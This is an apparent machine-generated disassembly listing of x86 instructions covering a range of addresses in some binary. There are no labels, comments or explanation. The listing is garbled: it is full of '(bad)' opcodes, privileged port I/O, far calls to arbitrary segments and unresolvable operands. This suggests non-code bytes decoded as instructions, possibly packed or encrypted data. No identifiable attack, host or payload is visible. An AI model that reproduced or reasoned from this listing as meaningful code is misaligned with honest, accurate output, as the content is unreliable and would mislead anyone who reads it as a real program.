  425c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c7f:	test   BYTE PTR [eax-0x61],ah
  425c82:	lods   al,BYTE PTR ds:[esi]
  425c83:	or     al,0xa7
  425c85:	inc    ecx
  425c86:	lods   eax,DWORD PTR ds:[esi]
  425c87:	cs push ss
  425c89:	and    ecx,DWORD PTR [eax]
  425c8b:	and    al,0xc1
  425c8d:	push   esp
  425c8e:	inc    eax
  425c8f:	push   eax
  425c90:	stc    
  425c91:	push   0x1bafe2aa
  425c96:	mov    dh,ah
  425c98:	xchg   esi,eax
  425c99:	mov    ecx,0x4e8b44cb
  425c9e:	jnp    0x425cf8
  425ca0:	sbb    ah,cl
  425ca2:	mov    cs,edi
  425ca4:	dec    ebp
  425ca5:	stc    
  425ca6:	jbe    0x425ce8
  425ca8:	inc    edi
  425ca9:	sbb    DWORD PTR [ebx-0x3fc9e26f],eax
  425caf:	fs (bad) 
  425cb1:	sub    eax,0xabfc773e
  425cb6:	mov    dl,0x84
  425cb8:	inc    eax
  425cb9:	nop
  425cba:	jp     0x425ca3
  425cbc:	inc    eax
  425cbd:	rcr    DWORD PTR [ebx-0x2c],1
  425cc0:	(bad)  
  425cc1:	(bad)  
  425cc3:	or     edx,DWORD PTR [eax-0x600d7d22]
  425cc9:	retf   
  425cca:	jge    0x425caf
  425ccc:	std    
  425ccd:	sti    
  425cce:	mov    BYTE PTR es:[edx-0x2308d1c0],dl
  425cd5:	(bad)  
  425cd6:	ds bound edi,QWORD PTR ss:[edx-0x13d32da8]
  425cde:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  425ce0:	(bad)  
  425ce1:	or     DWORD PTR ds:0xc9801df4,ebx
  425ce7:	jns    0x425d63
  425ce9:	das    
  425cea:	dec    DWORD PTR [edi]
  425cec:	enter  0x3d75,0xae
  425cf0:	inc    esi
  425cf1:	dec    ebp
  425cf2:	loop   0x425d41
  425cf4:	mov    eax,DWORD PTR [edi]
  425cf6:	pop    es
  425cf7:	sub    DWORD PTR [edx+0x19],eax
  425cfa:	call   esi
  425cfc:	mov    edx,0xda37a1df
  425d01:	cs aad 0xe6
  425d04:	cmc    
  425d05:	cmp    bl,BYTE PTR [eax-0x5]
  425d08:	mov    ecx,DWORD PTR [edi-0x423c9190]
  425d0e:	inc    ebx
  425d0f:	jae    0x425ca4
  425d11:	stc    
  425d12:	not    DWORD PTR [edi]
  425d14:	push   ebp
  425d15:	pop    edx
  425d16:	xchg   ebx,eax
  425d17:	mov    fs,esi
  425d19:	jge    0x425d6d
  425d1b:	push   ecx
  425d1c:	xchg   ebp,eax
  425d1d:	mov    WORD PTR [esi-0x642658fa],ss
  425d23:	sub    DWORD PTR ds:0x40062084,ecx
  425d29:	pop    ebp
  425d2a:	loopne 0x425cf4
  425d2c:	push   es
  425d2d:	xchg   edx,ebx
  425d2f:	iret   
  425d30:	inc    esi
  425d31:	cmp    eax,0x5499436c
  425d36:	add    esi,DWORD PTR [edx]
  425d38:	mov    ecx,0x564966dd
  425d3d:	rol    DWORD PTR [edx-0x3c],1
  425d40:	(bad)  
  425d41:	sub    bl,cl
  425d43:	xchg   esi,eax
  425d44:	or     eax,0x98e3c2a7
  425d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d4a:	test   BYTE PTR ds:0x27a142dd,ah
  425d50:	out    0xf1,al
  425d52:	in     al,dx
  425d53:	out    0xf8,eax
  425d55:	xchg   edi,eax
  425d56:	jb     0x425da4
  425d58:	repnz xor ebp,DWORD PTR [ecx-0x73]
  425d5c:	cmp    DWORD PTR [esi+eax*1-0x6b83bbac],ecx
  425d63:	adc    BYTE PTR [ecx-0x15],cl
  425d66:	stos   DWORD PTR es:[edi],eax
  425d67:	push   esp
  425d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d69:	sub    al,0x5a
  425d6b:	rol    BYTE PTR [eax+ecx*1],0x21
  425d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d70:	cs xchg ebp,edx
  425d73:	xchg   edi,eax
  425d74:	out    0x2d,al
  425d76:	cli    
  425d77:	xor    eax,0x5416a411
  425d7c:	std    
  425d7d:	add    eax,0x7c5d88f
  425d82:	(bad)  
  425d83:	sar    BYTE PTR [edx-0x2699c4ac],0x1
  425d8a:	iret   
  425d8b:	push   edi
  425d8c:	loope  0x425db2
  425d8e:	mov    dl,0xc9
  425d90:	xchg   esi,eax
  425d91:	sub    al,0x9d
  425d93:	out    dx,al
  425d94:	nop
  425d95:	test   BYTE PTR [edx],bl
  425d97:	xchg   DWORD PTR [ebx-0x14],ecx
  425d9a:	pop    edi
  425d9b:	push   esp
  425d9c:	mov    al,cl
  425d9e:	shr    ch,cl
  425da0:	mov    dl,0xb4
  425da2:	rcl    bh,cl
  425da4:	(bad)  
  425da5:	add    cl,BYTE PTR [esi]
  425da7:	imul   ebp,DWORD PTR [edi-0x3e762a94],0x53477bac
  425db1:	and    ebp,DWORD PTR [ebx-0x1fef8b20]
  425db7:	fwait
  425db8:	gs hlt 
  425dba:	(bad)
  425dbe:	push   ecx
  425dbf:	shl    edi,cl
  425dc1:	repz cmp DWORD PTR [ebx],0x6a2ff470
  425dc8:	mov    eax,ds:0x8da29543
  425dcd:	scas   al,BYTE PTR es:[edi]
  425dce:	bound  ecx,QWORD PTR [edx-0x37]
  425dd1:	push   ebx
  425dd2:	push   0x7c
  425dd4:	jnp    0x425d80
  425dd6:	pop    ebx
  425dd7:	test   esi,eax
  425dd9:	pushf  
  425dda:	jb     0x425df0
  425ddc:	push   eax
  425ddd:	daa    
  425dde:	je     0x425e4f
  425de0:	les    edi,FWORD PTR [eax-0x5244c89b]
  425de6:	ins    DWORD PTR es:[edi],dx
  425de7:	leave  
  425de8:	add    eax,esp
  425dea:	aas    
  425deb:	ja     0x425dbc
  425ded:	icebp  
  425dee:	retf   0x610
  425df1:	mov    esp,0x941eab39
  425df6:	loopne 0x425ddd
  425df8:	fld    DWORD PTR [ebx+0x75b348a0]
  425dfe:	or     BYTE PTR [edi-0x3a77d0a1],0x69
  425e05:	stc    
  425e06:	(bad)  
  425e07:	mov    ds:0xec404c4c,al
  425e0c:	mov    BYTE PTR [edx-0x7aa66e47],al
  425e12:	mov    cl,0x4
  425e14:	out    0x83,al
  425e16:	bound  esi,QWORD PTR [edi-0x6ee58938]
  425e1c:	ror    BYTE PTR [edx+edi*8+0x1c],0x7d
  425e21:	jg     0x425dec
  425e23:	jne    0x425da8
  425e25:	iret   
  425e26:	cmovle ebx,DWORD PTR [esi-0x4]
  425e2a:	stos   DWORD PTR es:[edi],eax
  425e2b:	fist   DWORD PTR [esp+esi*2-0x7d34cf00]
  425e32:	jae    0x425e2e
  425e34:	jnp    0x425e27
  425e36:	retf   
  425e37:	cld    
  425e38:	adc    al,0x79
  425e3a:	(bad)  
  425e3b:	fs retf 
  425e3d:	and    eax,0x1d68b35
  425e42:	add    bh,ah
  425e44:	add    DWORD PTR [eax],eax
  425e46:	add    cl,ah
  425e48:	aad    0x4b
  425e4a:	and    al,ah
  425e4c:	push   ecx
  425e4d:	iret   
  425e4e:	in     al,dx
  425e4f:	jo     0x425e23
  425e51:	pop    ds
  425e52:	call   0x19fc649e
  425e57:	add    al,0x30
  425e59:	js     0x425e9f
  425e5b:	or     al,0x9c
  425e5d:	pop    eax
  425e5e:	and    DWORD PTR [ebx-0x13a3ef1],ecx
  425e64:	jp     0x425e33
  425e66:	adc    ch,BYTE PTR [eax]
  425e68:	aam    0xf5
  425e6a:	add    DWORD PTR [eax-0x3f8c69a6],ebx
  425e70:	out    0x34,eax
  425e72:	mov    BYTE PTR [ebp-0x5f],ch
  425e75:	adc    DWORD PTR [eax-0x27],edi
  425e78:	xchg   ebp,eax
  425e79:	xor    esi,DWORD PTR [edi]
  425e7b:	jnp    0x425efc
  425e7d:	mov    dl,0xd
  425e7f:	add    eax,0xff35ac45
  425e84:	pop    edi
  425e85:	imul   BYTE PTR [edi+0x2475f3f1]
  425e8b:	pop    edi
  425e8c:	fcomp  st(2)
  425e8e:	aaa    
  425e8f:	xor    eax,DWORD PTR [bx+si-0x43]
  425e93:	in     al,dx
  425e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e95:	xor    al,0x3e
  425e98:	div    dh
  425e9a:	pop    edi
  425e9b:	or     al,0x7b
  425e9d:	add    DWORD PTR es:[edi],0x464363cc
  425ea4:	into   
  425ea5:	stos   DWORD PTR es:[edi],eax
  425ea6:	add    BYTE PTR [edi+0x6a],0xbb
  425eaa:	outs   dx,DWORD PTR ds:[esi]
  425eab:	add    al,0xeb
  425ead:	dec    edx
  425eae:	cs inc esi
  425eb0:	pop    edi
  425eb1:	pop    esp
  425eb2:	outs   dx,DWORD PTR ds:[esi]
  425eb3:	xchg   ebx,eax
  425eb4:	inc    ecx
  425eb5:	mov    ds:0xdf34e2c7,al
  425eba:	imul   dh
  425ebc:	outs   dx,BYTE PTR ds:[esi]
  425ebd:	arpl   WORD PTR [ecx+0x1147fc01],cx
  425ec3:	clc    
  425ec4:	les    ebp,FWORD PTR [edi+0x4bdda661]
  425eca:	push   ecx
  425ecb:	in     al,0xf7
  425ecd:	add    DWORD PTR [esi],esp
  425ecf:	push   ds
  425ed0:	jmp    0x425e95
  425ed2:	dec    ecx
  425ed3:	cmp    edi,esi
  425ed5:	dec    edi
  425ed6:	mov    bh,0x7d
  425ed8:	inc    eax
  425ed9:	inc    esi
  425eda:	xchg   ebp,eax
  425edb:	mov    dl,0x1c
  425edd:	add    BYTE PTR [ebp+0x45],cl
  425ee0:	imul   ebx,DWORD PTR [edx-0x366cfdc3],0xaa292fdf
  425eea:	sub    eax,0xbb36e7e4
  425eef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ef0:	out    0x4f,eax
  425ef2:	popf   
  425ef3:	data16 cld 
  425ef5:	(bad)  
  425ef6:	dec    ecx
  425ef7:	mov    ch,cl
  425ef9:	ds mov esp,0xe63a8089
  425eff:	xchg   DWORD PTR [edx+0x58],ebp
  425f02:	mov    ebx,0x6026e694
  425f07:	dec    eax
  425f08:	fcom   DWORD PTR [ecx-0x5a]
  425f0b:	xor    DWORD PTR [ecx],ebp
  425f0d:	adc    eax,0xe39e5f45
  425f12:	adc    bh,BYTE PTR [edx+ecx*8+0x5b]
  425f16:	nop
  425f17:	dec    eax
  425f18:	call   0x5674:0x68fb1378
  425f1f:	jecxz  0x425ec3
  425f21:	rol    BYTE PTR [edx-0x6066360b],1
  425f27:	js     0x425f4e
  425f29:	out    0x8a,al
  425f2b:	(bad)  [eax-0xd5c20b5]
  425f31:	daa    
  425f32:	dec    ebx
  425f34:	shr    DWORD PTR [ebx],1
  425f36:	jbe    0x425ed7
  425f38:	hlt    
  425f39:	push   cs
  425f3a:	out    dx,eax
  425f3b:	loope  0x425ec7
  425f3d:	xor    ecx,DWORD PTR [ebp+0x47]
  425f40:	test   DWORD PTR ds:[edi+0x7d5caa69],edi
  425f47:	jb     0x425f5f
  425f49:	fnsave [ebp-0x30e07f9d]
  425f4f:	loop   0x425f61
  425f51:	loopne 0x425eeb
  425f53:	ja     0x425f6a
  425f55:	aaa    
  425f56:	nop
  425f57:	jmp    0x425f92
  425f59:	mov    ch,0x41
  425f5b:	and    DWORD PTR [ebp-0x27890ccd],eax
  425f61:	xchg   ebp,eax
  425f62:	(bad)  
  425f63:	adc    eax,esp
  425f65:	mov    WORD PTR [ecx+0x3a],ss
  425f68:	call   0x6224:0x7ac4ee65
  425f6f:	ficom  WORD PTR [esi]
  425f71:	cwde   
  425f72:	jo     0x425feb
  425f74:	fsubp  st(6),st
  425f76:	xor    eax,0xfc0d78ce
  425f7b:	mov    ecx,0xc035d075
  425f80:	push   esi
  425f81:	aad    0x8d
  425f83:	or     edx,ebx
  425f85:	xor    edi,edx
  425f87:	imul   ecx,DWORD PTR [ecx+0x4031a398],0x14a091e4
  425f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f92:	cwde   
  425f93:	sub    eax,0xe80d6deb
  425f98:	and    ecx,ebp
  425f9a:	ins    DWORD PTR es:[edi],dx
  425f9b:	jns    0x425fab
  425f9d:	leave  
  425f9e:	xlat   BYTE PTR ds:[ebx]
  425f9f:	xor    eax,0x114f7f44
  425fa4:	test   BYTE PTR [ecx+edi*4],al
  425fa7:	or     DWORD PTR [ebp-0x7b88d3a8],ebx
  425fad:	jae    0x425fe8
  425faf:	std    
  425fb0:	jbe    0x425f3d
  425fb2:	push   eax
  425fb3:	addps  xmm3,xmm0
  425fb6:	adc    bh,ah
  425fb8:	xor    BYTE PTR [esi-0x2764d0c7],bl
  425fbe:	mov    edx,0xa48a24fa
  425fc3:	add    esp,DWORD PTR [ecx-0x3fa25cc2]
  425fc9:	mov    ds:0x5a9f5aeb,al
  425fce:	mov    dl,0x25
  425fd0:	shr    BYTE PTR [edi],0xfb
  425fd3:	in     al,0x30
  425fd5:	sbb    ch,BYTE PTR [eax-0x3a]
  425fd8:	jmp    0xacb70db8
  425fdd:	jnp    0x426035
  425fdf:	push   ebp
  425fe0:	fwait
  425fe1:	cmp    DWORD PTR ds:0xbf0056be,0xffffffad
  425fe8:	(bad)  
  425fea:	xor    DWORD PTR [edi+0xd],0xf164d8de
  425ff1:	arpl   WORD PTR [ebp+0xf],bp
  425ff4:	push   ss
  425ff5:	pop    esi
  425ff6:	clc    
  425ff7:	inc    ecx
  425ff8:	syscall 
  425ffa:	xchg   ecx,eax
  425ffb:	xchg   DWORD PTR ds:0xd3b815c4,edx
  426001:	fstp   QWORD PTR [ebp+0x4ac024fa]
  426007:	out    dx,al
  426008:	cmp    eax,0x1306c170
  42600d:	xor    BYTE PTR [esi],dl
  42600f:	or     DWORD PTR fs:[edx-0x35],ebx
  426013:	jb     0x425fdf
  426015:	out    0x89,al
  426017:	scas   al,BYTE PTR es:[edi]
  426018:	inc    edi
  426019:	xlat   BYTE PTR ds:[ebx]
  42601a:	jl     0x426012
  42601c:	xor    al,0xa8
  42601f:	cmc    
  426020:	mov    dh,0xab
  426022:	fsubr  QWORD PTR [ecx+0x5030d362]
  426028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426029:	inc    esi
  42602a:	scas   eax,DWORD PTR es:[edi]
  42602b:	push   cs
  42602c:	adc    al,0xe0
  42602e:	add    bh,dh
  426030:	in     eax,0x9f
  426032:	jp     0x425fd3
  426034:	jp     0x42602d
  426036:	in     eax,dx
  426037:	xor    al,dl
  426039:	xor    cl,ch
  42603b:	sbb    ah,ah
  42603d:	dec    esp
  42603e:	hlt    
  42603f:	jb     0x426019
  426041:	add    DWORD PTR [eax],eax
  426043:	out    0x1,eax
  426045:	add    BYTE PTR [eax],al
  426047:	in     eax,0x4d
  426049:	add    ecx,DWORD PTR [esp+edi*2]
  42604c:	adc    ebp,eax
  42604e:	sbb    dh,BYTE PTR [eax+0x35dd9afb]
  426054:	pop    ebp
  426055:	je     0x426098
  426057:	mov    edi,es
  426059:	lea    edx,[edi-0x6d]
  42605c:	inc    edi
  42605d:	jno    0x426008
  42605f:	mov    cs,WORD PTR [edx]
  426061:	addr16 je 0x42604a
  426064:	sbb    al,0xd8
  426066:	stos   DWORD PTR es:[edi],eax
  426067:	pop    ds
  426068:	inc    ebp
  426069:	arpl   WORD PTR [ebp+0x3e07ce5b],di
  42606f:	xchg   edx,eax
  426070:	add    esi,edx
  426072:	pop    esp
  426073:	icebp  
  426074:	test   dh,ch
  426076:	dec    esp
  426077:	push   ds
  426078:	in     al,0x52
  42607a:	or     edx,0xffffff9d
  42607d:	pop    edx
  42607e:	jo     0x426070
  426080:	sti    
  426081:	mov    edi,0xc296b150
  426086:	ss mov ch,0x75
  426089:	loopne 0x426087
  42608b:	jp     0x426039
  42608d:	pushf  
  42608e:	jg     0x4260bb
  426090:	enter  0x5ff1,0x2d
  426094:	mov    ch,0xe
  426096:	mov    cl,0x37
  426098:	xchg   esp,eax
  426099:	adc    DWORD PTR [ecx],0xffffff86
  42609c:	mov    bh,0xb1
  42609e:	int3   
  42609f:	push   0xb4260848
  4260a4:	pop    edi
  4260a5:	mov    esi,0xffc2af75
  4260aa:	scas   ax,WORD PTR es:[edi]
  4260ac:	fcom   DWORD PTR [edx+0x64]
  4260af:	pusha  
  4260b0:	sar    ebx,1
  4260b2:	out    0x7e,eax
  4260b4:	(bad)  
  4260b6:	mov    ch,0x1f
  4260b8:	push   ds
  4260b9:	pop    ebx
  4260ba:	inc    edi
  4260bb:	inc    eax
  4260bc:	jle    0x42607a
  4260be:	mov    bl,BYTE PTR cs:[edx+0x72]
  4260c2:	push   edx
  4260c3:	int    0xa9
  4260c5:	ja     0x42604f
  4260c7:	stc    
  4260c8:	sbb    edx,DWORD PTR [edi-0x78]
  4260cb:	mov    ecx,0x490005ba
  4260d0:	sub    eax,0xe9106ece
  4260d5:	(bad)  
  4260d6:	div    DWORD PTR [esp+eax*2+0x41]
  4260da:	dec    ecx
  4260db:	cld    
  4260dc:	mov    bl,0x3a
  4260de:	fwait
  4260df:	push   esp
  4260e0:	dec    ecx
  4260e1:	xchg   DWORD PTR [ecx],ecx
  4260e3:	in     al,dx
  4260e4:	hlt    
  4260e5:	call   FWORD PTR [edx+0x5b]
  4260e8:	mov    eax,ds:0x737eac50
  4260ed:	or     DWORD PTR [ebp-0xd3a31b],ecx
  4260f3:	aaa    
  4260f4:	dec    esp
  4260f5:	mov    WORD PTR [edx-0x1ae0967],es
  4260fb:	add    eax,eax
  4260fd:	lea    ecx,[esi+esi*8-0x28]
  426101:	sub    DWORD PTR [edi-0x23],edx
  426104:	leave  
  426105:	sbb    eax,0xba53169a
  42610a:	sub    ch,0x0
  42610d:	mov    esi,0x3e1d1a7d
  426112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426113:	sub    edi,ecx
  426115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426116:	push   eax
  426117:	jmp    0x4260a2
  426119:	cmp    esp,DWORD PTR [edx-0x1f27f1e9]
  42611f:	loopne 0x42616f
  426121:	mov    eax,0xf17e98c8
  426126:	xchg   ecx,eax
  426127:	sbb    ah,BYTE PTR [edi]
  426129:	mov    ebx,0xa948b771
  42612e:	sub    DWORD PTR [ebp+0x51f4da4],eax
  426134:	adc    ch,BYTE PTR [edx+0x59]
  426137:	(bad)  
  426138:	pusha  
  426139:	and    edx,eax
  42613b:	(bad)  
  42613c:	sub    DWORD PTR [ebp+0x23],ebx
  42613f:	aam    0x53
  426141:	push   0x8790a4e6
  426146:	push   ebp
  426147:	xor    BYTE PTR [esi+0x1c53be35],bl
  42614d:	push   esp
  42614e:	pop    eax
  42614f:	or     eax,0x20e8283a
  426154:	cli    
  426155:	out    dx,al
  426156:	imul   ebx,DWORD PTR [esi+esi*1],0xffffffbd
  42615a:	mov    ah,0x51
  42615c:	mov    cl,0x8e
  42615e:	pushf  
  42615f:	xchg   edi,eax
  426160:	imul   esp,DWORD PTR [edi+ebx*8],0x49
  426164:	pop    ss
  426165:	test   eax,0xa1bab6fa
  42616a:	mov    bl,0xd2
  42616c:	xchg   esi,eax
  42616d:	test   al,0xc3
  42616f:	xor    BYTE PTR [esi-0x14],dl
  426172:	sti    
  426173:	inc    edi
  426174:	mov    dl,0x0
  426176:	aad    0x88
  426178:	cwde   
  426179:	jl     0x426173
  42617b:	sub    eax,0x240236cf
  426180:	fcmovnb st,st(2)
  426182:	cdq    
  426183:	jo     0x426136
  426185:	cwde   
  426186:	call   0xb935:0x60631936
  42618d:	dec    eax
  42618e:	into   
  42618f:	push   esi
  426190:	mov    BYTE PTR [ebx-0x5b],ch
  426193:	mov    ?,WORD PTR [ecx]
  426195:	fcom   DWORD PTR [eax]
  426197:	loopne 0x426133
  426199:	xchg   ebx,eax
  42619a:	inc    esi
  42619b:	sbb    al,0x3f
  42619d:	lock pop esi
  42619f:	mov    esp,0xb683fe47
  4261a4:	dec    ecx
  4261a5:	out    0xde,eax
  4261a7:	mov    ds:0xfda5b588,al
  4261ac:	inc    ecx
  4261ad:	pop    ds
  4261ae:	adc    esi,DWORD PTR [edi]
  4261b0:	mov    ah,0x71
  4261b2:	out    0x7c,eax
  4261b4:	adc    eax,DWORD PTR [eax]
  4261b6:	push   edx
  4261b7:	adc    esi,DWORD PTR ds:0x3af60ac7
  4261bd:	call   0x4b63:0x1953a9bd
  4261c4:	inc    esi
  4261c5:	pop    esp
  4261c6:	pop    esi
  4261c7:	jp     0x4261f0
  4261c9:	sbb    DWORD PTR [esi-0xa4fe5c0],edi
  4261cf:	dec    ebx
  4261d0:	out    dx,al
  4261d1:	out    0xed,al
  4261d3:	pushf  
  4261d4:	int3   
  4261d5:	add    dl,BYTE PTR [ecx]
  4261d7:	frstor [edx-0x206632cd]
  4261dd:	test   eax,0xd1a92622
  4261e2:	mov    ecx,DWORD PTR [ecx]
  4261e4:	or     DWORD PTR ds:0x525837a5,ebp
  4261ea:	fadd   DWORD PTR [eax+0x4e823172]
  4261f0:	jl     0x426255
  4261f2:	xor    DWORD PTR [ebp+0xb],esp
  4261f5:	mov    ds,WORD PTR [eax-0x74]
  4261f8:	sbb    al,0x54
  4261fa:	(bad)  
  4261fb:	pusha  
  4261fc:	mov    ecx,0x4bd182d
  426201:	push   ebp
  426202:	and    BYTE PTR [eax-0x79],ch
  426205:	mov    dl,0x0
  426207:	sbb    eax,0xc5e63461
  42620c:	fild   DWORD PTR fs:[esi-0x6a]
  426210:	push   edi
  426211:	mov    WORD PTR [ebx],ds
  426213:	cld    
  426214:	cmp    dh,BYTE PTR [ebx-0x70]
  426217:	mov    ?,WORD PTR [ecx+0x6bbf4111]
  42621d:	and    bh,dh
  42621f:	sub    al,0x8b
  426221:	or     ecx,DWORD PTR [edx]
  426223:	mov    edx,0xd73dc386
  426228:	xchg   edi,eax
  426229:	(bad)  
  42622b:	jns    0x42622a
  42622d:	add    DWORD PTR [eax],eax
  42622f:	imul   ecx,DWORD PTR [edi+0x7dee7c8a],0xffffffff
  426236:	lahf   
  426237:	loope  0x426240
  426239:	adc    al,0x86
  42623b:	fld    st(2)
  42623d:	inc    esi
  42623e:	jns    0x426299
  426240:	fiadd  DWORD PTR [ecx]
  426242:	add    bh,ah
  426244:	add    DWORD PTR [eax],eax
  426246:	add    BYTE PTR [edi+0x2704623c],dl
  42624c:	outs   dx,DWORD PTR ds:[esi]
  42624d:	daa    
  42624e:	adc    bl,al
  426250:	fsubr  DWORD PTR [ebx]
  426252:	rcl    DWORD PTR [ebx-0xd],cl
  426255:	aaa    
  426256:	sub    eax,0x5f2f1f72
  42625b:	mov    esi,0xbaac79f7
  426260:	xor    al,0xc1
  426262:	adc    ah,cl
  426264:	mov    WORD PTR [esi+eiz*8],gs
  426267:	lahf   
  426268:	pop    ebp
  426269:	sbb    BYTE PTR [esi-0x70],bh
  42626c:	addr16 push cs
  42626e:	jns    0x42629a
  426270:	mov    ds:0xd0081627,al
  426275:	xor    eax,0x99428ccc
  42627a:	fwait
  42627b:	sub    ch,0xcb
  42627e:	out    dx,eax
  42627f:	cli    
  426280:	(bad)  
  426281:	jmp    0xd33b:0x7aa3641e
  426288:	fnstcw WORD PTR [edx]
  42628a:	mov    ch,0xc5
  42628c:	pusha  
  42628d:	jnp    0x42630a
  42628f:	sbb    ch,BYTE PTR [edi+0x3d]
  426292:	cmp    al,0x31
  426294:	inc    edi
  426295:	inc    ebp
  426296:	sub    al,BYTE PTR [edx+edx*8-0x4e]
  42629a:	jne    0x426256
  42629c:	sbb    BYTE PTR [edx],0xe8
  42629f:	push   esp
  4262a0:	pop    ebp
  4262a1:	js     0x426285
  4262a3:	xchg   ebx,eax
  4262a4:	(bad)  
  4262a5:	lea    ebp,[ecx-0x7]
  4262a8:	jecxz  0x42623a
  4262aa:	js     0x426238
  4262ac:	repnz inc edi
  4262ae:	mov    ch,0x3a
  4262b0:	pop    ds
  4262b1:	mov    edx,0x1fe9378f
  4262b6:	xchg   esi,eax
  4262b7:	mov    esi,DWORD PTR [esi-0x2307280b]
  4262bd:	xchg   esp,eax
  4262be:	mov    ds:0x368bb846,eax
  4262c3:	pop    ecx
  4262c4:	pop    es
  4262c5:	rcr    DWORD PTR [edx],0x50
  4262c8:	jb     0x426323
  4262ca:	pop    esi
  4262cb:	mov    edi,0x70d5f4ba
  4262d0:	test   eax,0xf655f566
  4262d5:	fs cmp eax,0xe159dd68
  4262db:	rcr    dh,cl
  4262dd:	cmp    esp,edx
  4262df:	or     BYTE PTR [edi-0x26],cl
  4262e2:	push   0x9
  4262e4:	xchg   esp,eax
  4262e5:	fiadd  WORD PTR [esp+eiz*2-0x57]
  4262e9:	xor    ah,BYTE PTR ss:0xcb00a158
  4262f0:	call   0xdbe7f054
  4262f5:	mov    ebx,0x753dffa
  4262fa:	jle    0x426323
  4262fc:	sbb    BYTE PTR [ebx],0x49
  4262ff:	fldcw  WORD PTR ds:0x3bcca897
  426305:	xchg   esp,eax
  426306:	ror    BYTE PTR [eax],1
  426308:	icebp  
  426309:	mov    WORD PTR gs:[ecx*4+0x38e917b6],ds
  426311:	pop    esi
  426312:	fild   DWORD PTR [esi+0x47fdb3f6]
  426318:	stos   BYTE PTR es:[edi],al
  426319:	cld    
  42631a:	sub    eax,0x3891f528
  42631f:	outs   dx,DWORD PTR ds:[esi]
  426320:	dec    esi
  426321:	ss xchg edi,eax
  426323:	mov    cl,0x34
  426325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426326:	inc    edi
  426327:	inc    esi
  426328:	ins    BYTE PTR es:[edi],dx
  426329:	inc    edi
  42632a:	push   eax
  42632b:	sbb    eax,0x7116261a
  426330:	sub    BYTE PTR [edx+0x28f46914],ah
  426336:	cmp    al,0xaf
  426338:	push   0xffffffd9
  42633a:	jmp    0x38afa0a4
  42633f:	adc    edi,DWORD PTR [edx-0x60]
  426342:	push   edx
  426343:	sub    DWORD PTR [eax],eax
  426345:	ror    bh,0x41
  426348:	jb     0x42631c
  42634a:	stos   DWORD PTR es:[edi],eax
  42634b:	add    al,0xa1
  42634d:	repnz dec ebx
  42634f:	aas    
  426350:	shr    DWORD PTR [ebp-0x2498a67],0xdd
  426357:	and    esp,ebx
  426359:	fild   DWORD PTR [esi]
  42635b:	fmul   DWORD PTR [esi]
  42635d:	lar    ecx,WORD PTR [ecx-0x1b66ffb5]
  426364:	mov    al,0xe7
  426366:	out    0xb8,eax
  426368:	loopne 0x42637b
  42636a:	mov    eax,0xa821377b
  42636f:	cmp    DWORD PTR [edi-0x7331242e],ecx
  426375:	mov    eax,ds:0xe1212807
  42637a:	cmp    al,0x56
  42637c:	pop    edi
  42637d:	jle    0x426313
  42637f:	push   esp
  426380:	mov    edi,0x2421bb9b
  426385:	or     eax,0xddb2ae9f
  42638a:	scas   al,BYTE PTR es:[edi]
  42638b:	mov    eax,0xae53c530
  426390:	into   
  426391:	fmul   QWORD PTR [edx+ebp*1]
  426394:	push   ebx
  426395:	push   0xee14f54f
  42639a:	xchg   edi,eax
  42639b:	pop    ebx
  42639c:	mov    BYTE PTR [esi],al
  42639e:	aas    
  42639f:	nop
  4263a0:	fisttp QWORD PTR [edx-0x1]
  4263a3:	xor    ebx,DWORD PTR [edi+0x66]
  4263a6:	out    0xa3,eax
  4263a8:	jl     0x426424
  4263aa:	lea    edi,[ebx+0x501d1681]
  4263b0:	inc    esi
  4263b1:	xor    cl,ah
  4263b3:	cs and al,al
  4263b6:	dec    ebx
  4263b7:	push   es
  4263b8:	paddq  mm0,QWORD PTR [ecx]
  4263bb:	add    BYTE PTR [esi],ch
  4263bd:	jle    0x42642a
  4263bf:	mov    bl,0xd6
  4263c1:	sbb    bh,BYTE PTR [esi-0x4ba4f743]
  4263c7:	push   esp
  4263c8:	out    dx,eax
  4263c9:	call   0xd3c:0xe131a50b
  4263d0:	cli    
  4263d1:	enter  0xf59c,0x80
  4263d5:	cmp    DWORD PTR [esi+edi*8+0x7b997f83],ecx
  4263dc:	in     eax,dx
  4263dd:	(bad)  
  4263de:	jle    0x4263f1
  4263e0:	sbb    BYTE PTR [edx-0x50],al
  4263e3:	mov    eax,0x1ec36995
  4263e8:	mov    esi,edi
  4263ea:	pusha  
  4263eb:	cmp    BYTE PTR [ecx],dh
  4263ed:	out    dx,al
  4263ee:	pop    esi
  4263ef:	ret    0x1799
  4263f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263f3:	and    ebx,DWORD PTR [ecx]
  4263f5:	retf   
  4263f6:	daa    
  4263f7:	lods   al,BYTE PTR ds:[esi]
  4263f8:	mov    esp,0x1acc9018
  4263fd:	fistp  WORD PTR [ecx-0x5e]
  426400:	(bad)  
  426401:	dec    edi
  426402:	lods   al,BYTE PTR ds:[esi]
  426403:	inc    edi
  426404:	ss pop esi
  426406:	adc    DWORD PTR fs:[ecx+0x7b79c8c8],ecx
  42640d:	fsub   st,st(4)
  42640f:	xchg   ebx,eax
  426410:	mov    dh,BYTE PTR [ebp-0xd703471]
  426416:	int    0x42
  426418:	nop
  426419:	test   esp,ecx
  42641b:	and    eax,0x5bb1f1ee
  426420:	fisttp DWORD PTR [esi+0x46]
  426423:	sti    
  426424:	ja     0x426441
  426426:	retf   
  426427:	cmp    al,0xe
  426429:	(bad)
  42642d:	hlt    
  42642e:	add    BYTE PTR [ebp+0x6a],dl
  426431:	out    0xb3,al
  426433:	(bad)  
  426434:	mov    edi,0xa2aee55
  426439:	idiv   DWORD PTR [eax]
  42643b:	sti    
  42643c:	and    DWORD PTR ds:0x1dc408e,edx
  426442:	add    bh,ah
  426444:	add    DWORD PTR [eax],eax
